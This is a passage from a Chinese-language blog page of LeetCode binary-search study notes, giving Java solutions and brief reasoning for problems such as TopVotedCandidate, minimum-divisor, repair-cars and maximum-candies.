class="number">0</span>])&#123;</span><br><span class="line">                    candidateNo = i;</span><br><span class="line">                    candidateVotedNum = retVal[<span class="number">0</span>];</span><br><span class="line">                    lastTime = retVal[<span class="number">1</span>];</span><br><span class="line">                &#125;<span class="keyword">else</span> <span class="keyword">if</span> (candidateVotedNum == retVal[<span class="number">0</span>] &amp;&amp; lastTime &lt; retVal[<span class="number">1</span>])&#123;</span><br><span class="line">                    candidateNo = i;</span><br><span class="line">                    lastTime = retVal[<span class="number">1</span>];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> candidateNo;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span>[] upper_bound(List&lt;Integer&gt; list, <span class="type">int</span> t) &#123;</span><br><span class="line">        <span class="comment">//获得最右边小于等于t的票数，如果没有就返回0</span></span><br><span class="line">        <span class="comment">// num[i]&lt;=t</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">low</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">high</span> <span class="operator">=</span> list.size() - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (low &lt; high) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> low + (high - low + <span class="number">1</span>) / <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span> (list.get(mid) &lt;= t) &#123;</span><br><span class="line">                low = mid;</span><br><span class="line">            &#125; <span class="keyword">else</span> high = mid - <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (list.get(low) &gt; t) <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0</span>, <span class="number">0</span>&#125;;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;low + <span class="number">1</span>, list.get(low)&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Your TopVotedCandidate object will be instantiated and called as such:</span></span><br><span class="line"><span class="comment"> * TopVotedCandidate obj = new TopVotedCandidate(persons, times);</span></span><br><span class="line"><span class="comment"> * int param_1 = obj.q(t);</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>

<p>思路二</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">二分 + 维护在某个时刻的候选人是谁</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">TopVotedCandidate</span> &#123;</span><br><span class="line"></span><br><span class="line">    List&lt;<span class="type">int</span>[]&gt; list;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">TopVotedCandidate</span><span class="params">(<span class="type">int</span>[] persons, <span class="type">int</span>[] times)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> persons.length;</span><br><span class="line">        list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="type">int</span> <span class="variable">maxVoteNum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        Map&lt;Integer, Integer&gt; record = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; persons.length; i++) &#123;</span><br><span class="line">            record.merge(persons[i], <span class="number">1</span>, Integer::sum);</span><br><span class="line">            <span class="keyword">if</span>(record.get(persons[i]) &gt;= maxVoteNum)&#123;</span><br><span class="line">                maxVoteNum = record.get(persons[i]);</span><br><span class="line">                list.add(<span class="keyword">new</span> <span class="title class_">int</span>[]&#123;times[i],persons[i]&#125;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">q</span><span class="params">(<span class="type">int</span> t)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">low</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">high</span> <span class="operator">=</span> list.size() - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (low &lt; high)&#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> low + (high - low + <span class="number">1</span>) / <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span>(list.get(mid)[<span class="number">0</span>] &lt;= t) low = mid;</span><br><span class="line">            <span class="keyword">else</span> high = mid - <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//一定有结果，不需要特判</span></span><br><span class="line">        <span class="keyword">return</span> list.get(low)[<span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Your TopVotedCandidate object will be instantiated and called as such:</span></span><br><span class="line"><span class="comment"> * TopVotedCandidate obj = new TopVotedCandidate(persons, times);</span></span><br><span class="line"><span class="comment"> * int param_1 = obj.q(t);</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>

<h3 id="LCP-08-剧情触发时间"><a href="#LCP-08-剧情触发时间" class="headerlink" title="LCP 08. 剧情触发时间"></a><a href="https://leetcode.cn/problems/ju-qing-hong-fa-shi-jian/">LCP 08. 剧情触发时间</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">二分查找，不断缩小范围</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] getTriggerTime(<span class="type">int</span>[][] increase, <span class="type">int</span>[][] requirements) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> increase.length;</span><br><span class="line">        <span class="type">int</span>[][] record = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">3</span>][n + <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; increase.length; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; <span class="number">3</span>; j++) &#123;</span><br><span class="line">                record[j][i + <span class="number">1</span>] = increase[i][j] + record[j][i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">m</span> <span class="operator">=</span> requirements.length;</span><br><span class="line">        <span class="type">int</span>[] res = <span class="keyword">new</span> <span class="title class_">int</span>[m];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">retValC</span> <span class="operator">=</span> lower_bound(record[<span class="number">0</span>], requirements[i][<span class="number">0</span>],<span class="number">0</span>, record[<span class="number">0</span>].length - <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">if</span>(retValC == -<span class="number">1</span>)&#123;</span><br><span class="line">                res[i] = -<span class="number">1</span>;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">int</span> <span class="variable">retValR</span> <span class="operator">=</span> lower_bound(record[<span class="number">1</span>], requirements[i][<span class="number">1</span>],retValC, record[<span class="number">0</span>].length - <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">if</span>(retValR == -<span class="number">1</span>)&#123;</span><br><span class="line">                res[i] = -<span class="number">1</span>;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            res[i] = lower_bound(record[<span class="number">2</span>], requirements[i][<span class="number">2</span>],retValR, record[<span class="number">0</span>].length - <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> <span class="title function_">lower_bound</span><span class="params">(<span class="type">int</span>[] arr, <span class="type">int</span> target, <span class="type">int</span> low, <span class="type">int</span> high)</span> &#123;</span><br><span class="line">        <span class="keyword">while</span> (low &lt; high) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> low + (high - low) / <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span> (arr[mid] &gt;= target) &#123;</span><br><span class="line">                high = mid;</span><br><span class="line">            &#125;<span class="keyword">else</span> low = mid + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>( arr[low] &gt;= target) <span class="keyword">return</span> low;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h2 id="二分答案：求最小"><a href="#二分答案：求最小" class="headerlink" title="二分答案：求最小"></a>二分答案：求最小</h2><h3 id="1283-使结果不超过阈值的最小除数"><a href="#1283-使结果不超过阈值的最小除数" class="headerlink" title="1283. 使结果不超过阈值的最小除数"></a><a href="https://leetcode.cn/problems/find-the-smallest-divisor-given-a-threshold/">1283. 使结果不超过阈值的最小除数</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">二分+小trick</span><br><span class="line">即向上取整可以通过 (a + (b - 1))/b 来向上取整</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Solution &#123;</span><br><span class="line">    public int smallestDivisor(int[] nums, int threshold) &#123;</span><br><span class="line">        int low = 1;</span><br><span class="line">        int high = Integer.MAX_VALUE;</span><br><span class="line">        while (low &lt; high) &#123;</span><br><span class="line">            int mid = low + (high - low) / 2;//low&lt;=mid&lt;high</span><br><span class="line">            long sum = 0;</span><br><span class="line">            for (int num : nums) &#123;</span><br><span class="line">                sum += (num + mid - 1) / mid;</span><br><span class="line">            &#125;</span><br><span class="line">            if(sum &lt;= threshold)&#123;</span><br><span class="line">                high = mid;</span><br><span class="line">            &#125;else &#123;</span><br><span class="line">                low = mid + 1;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return low;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="2187-完成旅途的最少时间"><a href="#2187-完成旅途的最少时间" class="headerlink" title="2187. 完成旅途的最少时间"></a><a href="https://leetcode.cn/problems/minimum-time-to-complete-trips/">2187. 完成旅途的最少时间</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">二分</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">long</span> <span class="title function_">minimumTime</span><span class="params">(<span class="type">int</span>[] time, <span class="type">int</span> totalTrips)</span> &#123;</span><br><span class="line">        <span class="type">long</span> <span class="variable">low</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">        <span class="type">long</span> <span class="variable">high</span> <span class="operator">=</span> Long.MAX_VALUE;</span><br><span class="line">        <span class="keyword">while</span> (low &lt; high)&#123;</span><br><span class="line">            <span class="type">long</span> <span class="variable">mid</span> <span class="operator">=</span> low + (high - low) / <span class="number">2</span>;</span><br><span class="line">            <span class="type">long</span> <span class="variable">sum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> i : time) &#123;</span><br><span class="line">                sum += mid / i;</span><br><span class="line">                <span class="keyword">if</span>(sum &gt;= totalTrips) <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(sum &gt;= totalTrips)&#123;</span><br><span class="line">                high = mid;</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                low = mid + <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> low;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>if(sum &gt;&#x3D; totalTrips) break; 必须写这行否则会溢出，写了也可以缩短执行时间</p>
<h3 id="1870-准时到达的列车最小时速"><a href="#1870-准时到达的列车最小时速" class="headerlink" title="1870. 准时到达的列车最小时速"></a><a href="https://leetcode.cn/problems/minimum-speed-to-arrive-on-time/">1870. 准时到达的列车最小时速</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">二分</span><br><span class="line">这里有个注意点是需要避免浮点数运算，因为浮点数运算会产生误差</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">minSpeedOnTime</span><span class="params">(<span class="type">int</span>[] dist, <span class="type">double</span> hour)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">low</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">high</span> <span class="operator">=</span> (<span class="type">int</span>) <span class="number">1e7</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">preTotTime</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(dist.length - <span class="number">1</span> &gt;= hour) <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (low &lt; high) &#123;</span><br><span class="line">            preTotTime = <span class="number">0</span>;</span><br><span class="line">            <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> low + (high - low) / <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; dist.length - <span class="number">1</span>; i++) &#123;</span><br><span class="line">                preTotTime += (dist[i] + mid - <span class="number">1</span>) / mid;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">long</span> <span class="variable">expLeft</span> <span class="operator">=</span> ((<span class="type">long</span>) preTotTime * mid + dist[dist.length - <span class="number">1</span>]) * <span class="number">100</span>;</span><br><span class="line">            <span class="type">long</span> <span class="variable">expRight</span> <span class="operator">=</span> ((<span class="type">long</span>) Math.round(hour * <span class="number">100</span>) * mid);</span><br><span class="line">            <span class="keyword">if</span> (expLeft &lt;= expRight)&#123;</span><br><span class="line">                high = mid;</span><br><span class="line">            &#125;<span class="keyword">else</span> low = mid + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> low;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="475-供暖器"><a href="#475-供暖器" class="headerlink" title="475. 供暖器"></a><a href="https://leetcode.cn/problems/heaters/">475. 供暖器</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">排序+二分查找</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">findRadius</span><span class="params">(<span class="type">int</span>[] houses, <span class="type">int</span>[] heaters)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        Arrays.sort(heaters);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; houses.length; i++) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> upper_bound(heaters, houses[i]);</span><br><span class="line">            <span class="keyword">if</span> (index == heaters.length - <span class="number">1</span>) res = Integer.max(res, Math.abs(houses[i] - heaters[index]));</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                res = Integer.max(res, Math.min(Math.abs(houses[i] - heaters[index]), Math.abs(houses[i] - heaters[index + <span class="number">1</span>])));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> <span class="title function_">upper_bound</span><span class="params">(<span class="type">int</span>[] arr, <span class="type">int</span> target)</span> &#123;</span><br><span class="line">        <span class="comment">//target &gt;= arr[i]</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">low</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">high</span> <span class="operator">=</span> arr.length - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (low &lt; high) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> low + (high - low + <span class="number">1</span>) / <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span> (target &gt;= arr[mid]) &#123;</span><br><span class="line">                low = mid;</span><br><span class="line">            &#125; <span class="keyword">else</span> high = mid - <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> low;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>todo：之后学下滑动窗口写法及其证明（感觉能滑，但不知道怎样滑和证明哎）</p>
<h3 id="2594-修车的最少时间"><a href="#2594-修车的最少时间" class="headerlink" title="2594. 修车的最少时间"></a><a href="https://leetcode.cn/problems/minimum-time-to-repair-cars/">2594. 修车的最少时间</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">r*n*n</span><br><span class="line">不是线性的，数学方法直接求解可能有点困难。</span><br><span class="line">我们可以使用二分法，二分时间</span><br><span class="line">设置low = 1, high = 10**14</span><br><span class="line">然后写代码即可</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">long</span> <span class="title function_">repairCars</span><span class="params">(<span class="type">int</span>[] ranks, <span class="type">int</span> cars)</span> &#123;</span><br><span class="line">        <span class="type">long</span> <span class="variable">low</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">        <span class="type">long</span> <span class="variable">high</span> <span class="operator">=</span> (<span class="type">long</span>) <span class="number">1e14</span>;</span><br><span class="line">        <span class="keyword">while</span> (low &lt; high)&#123;</span><br><span class="line">            <span class="type">long</span> <span class="variable">mid</span> <span class="operator">=</span> (low + high) / <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span>(check(ranks, cars, mid))&#123;</span><br><span class="line">                high = mid;</span><br><span class="line">            &#125;<span class="keyword">else</span> low = mid + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> low;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">check</span><span class="params">(<span class="type">int</span>[] ranks, <span class="type">int</span> cars, <span class="type">long</span> time)</span>&#123;</span><br><span class="line">        <span class="type">long</span> <span class="variable">carNum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; ranks.length; i++) &#123;</span><br><span class="line">            carNum += (<span class="type">long</span>) (Math.pow(time / ranks[i],<span class="number">0.5</span>));</span><br><span class="line">            <span class="keyword">if</span>(carNum &gt;= cars) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="1482-制作-m-束花所需的最少天数"><a href="#1482-制作-m-束花所需的最少天数" class="headerlink" title="1482. 制作 m 束花所需的最少天数]"></a><a href="https://leetcode.cn/problems/minimum-number-of-days-to-make-m-bouquets/">1482. 制作 m 束花所需的最少天数</a>]</h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">二分，但是要获取连续花感觉每次都得遍历一下</span><br><span class="line">复杂度nlg1e9</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">minDays</span><span class="params">(<span class="type">int</span>[] bloomDay, <span class="type">int</span> m, <span class="type">int</span> k)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">low</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">high</span> <span class="operator">=</span> (<span class="type">int</span>) <span class="number">1e9</span>;</span><br><span class="line">        System.out.println(bloomDay.length);<span class="comment">//35258</span></span><br><span class="line">        <span class="keyword">if</span> (bloomDay.length / k  &lt; m) <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (low &lt; high) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> low + (high - low) / <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span>(check(bloomDay, m, k, mid))&#123;</span><br><span class="line">                high = mid;</span><br><span class="line">            &#125;<span class="keyword">else</span> low = mid + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> low;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">check</span><span class="params">(<span class="type">int</span>[] bloomDay, <span class="type">int</span> m, <span class="type">int</span> k, <span class="type">int</span> day)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> bloomDay.length;</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">cnt</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (i &lt; n) &#123;</span><br><span class="line">            <span class="keyword">if</span> (bloomDay[i] &lt;= day) &#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">start</span> <span class="operator">=</span> i;</span><br><span class="line">                <span class="keyword">while</span> (i &lt; n - <span class="number">1</span> &amp;&amp; bloomDay[i + <span class="number">1</span>] &lt;= day) &#123;</span><br><span class="line">                    i++;</span><br><span class="line">                &#125;</span><br><span class="line">                cnt += (i - start + <span class="number">1</span>) / k * k;</span><br><span class="line">                <span class="keyword">if</span>(cnt &gt;= m * k) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            i++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="二分答案：求最大"><a href="#二分答案：求最大" class="headerlink" title="二分答案：求最大"></a>二分答案：求最大</h2><h3 id="2226-每个小孩最多能分到多少糖果"><a href="#2226-每个小孩最多能分到多少糖果" class="headerlink" title="2226. 每个小孩最多能分到多少糖果"></a><a href="https://leetcode.cn/problems/maximum-candies-allocated-to-k-children/">2226. 每个小孩最多能分到多少糖果</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">老实说，如果不是在二分题单，我还想不到二分，可能想怎样用数学方法计算出来</span><br><span class="line"></span><br><span class="line">以后对这种最大最小的要有心眼，一般要二分</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Solution &#123;</span><br><span class="line">    public int maximumCandies(int[] candies, long k) &#123;</span><br><span class="line">        int low = 0;</span><br><span class="line">        int high = Arrays.stream(candies).max().getAsInt();</span><br><span class="line">        while (low &lt; high)&#123;</span><br><span class="line">            int mid = low + (high - low + 1) / 2;</span><br><span class="line">            long people = 0;</span><br><span class="line">            for (int i = 0; i &lt; candies.length; i++) &#123;</span><br><span class="line">                people += candies[i] / mid;</span><br><span class="line">                if(people &gt;= k) break;</span><br><span class="line">            &#125;</span><br><span class="line">            if(people &gt;= k) low = mid;</span><br><span class="line">            else high = mid -1;</span><br><span class="line">        &#125;</span><br><span class="line">        return low;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里有个细节low + (high - low + 1) &#x2F; 2; 可以保证mid一定不为0，避免除0</p>
<h3 id="2982-找出出现至少三次的最长特殊子字符串-II"><a href="#2982-找出出现至少三次的最长特殊子字符串-II" class="headerlink" title="2982. 找出出现至少三次的最长特殊子字符串 II"></a><a href="https://leetcode.cn/problems/find-longest-special-substring-that-occurs-thrice-ii/">2982. 找出出现至少三次的最长特殊子字符串 II</a></h3><p>思路一：[2982. 找出出现至少三次的最长特殊子字符串 II - 力扣（LeetCode）</p>
<p>这个思路并没有用二分，而是直接遍历字母处理</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">maximumLength</span><span class="params">(String s)</span> &#123;</span><br><span class="line">        List&lt;Integer&gt;[] list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>[<span class="number">26</span>];</span><br><span class="line">        Arrays.setAll(list, k -&gt; <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;());</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> s.length();</span><br><span class="line">        <span class="keyword">while</span> (i &lt; n) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">start</span> <span class="operator">=</span> i;</span><br><span class="line">            <span class="keyword">while</span> (i &lt; n - <span class="number">1</span> &amp;&amp; s.charAt(start) == s.charAt(i + <span class="number">1</span>)) &#123;</span><br><span class="line">                i++;</span><br><span class="line">            &#125;</span><br><span class="line">            list[s.charAt(start) - <span class="string">&#x27;a&#x27;</span>].add(i - start + <span class="number">1</span>);</span><br><span class="line">            i++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; list.length; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (list[j].isEmpty()) <span class="keyword">continue</span>;</span><br><span class="line">            list[j].sort(Collections.reverseOrder());</span><br><span class="line">            list[j].add(<span class="number">0</span>);</span><br><span class="line">            list[j].add(<span class="number">0</span>);</span><br><span class="line">            <span class="type">int</span> <span class="variable">curRes</span> <span class="operator">=</span> Integer.max(Integer.min(list[j].get(<span class="number">0</span>) - <span class="number">1</span>, list[j].get(<span class="number">1</span>)), list[j].get(<span class="number">2</span>));</span><br><span class="line">            curRes = Integer.max(curRes, list[j].get(<span class="number">0</span>) - <span class="number">2</span>);</span><br><span class="line">            res = Integer.max(res, curRes);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res == <span class="number">0</span> ? -<span class="number">1</span> : res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>思路二</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">二分（当题目里面的k由3改成任意数字的加强做法）</span><br><span class="line">同样统计每种字母的连续出现的长度a，维护a的前k大。直接计算最长长度l较为麻烦，但是根据给定l验证是否出现至少k次较为容易。考虑到单调性，二分的思路是可行的</span><br></pre></td></tr></table></figure>

<p>懒得写代码了</p>
<h3 id="2576-求出最多标记下标"><a href="#2576-求出最多标记下标" class="headerlink" title="2576. 求出最多标记下标"></a><a href="https://leetcode.cn/problems/find-the-maximum-number-of-marked-indices/">2576. 求出最多标记下标</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">直观感觉可以先排序，然后贪心。即比如要匹配k组，那选最左边k个，和最右边k个判断即可。直接贪心判断次数即可。下面写下贪心方法和二分方法</span><br></pre></td></tr></table></figure>

<p>贪心代码</p>
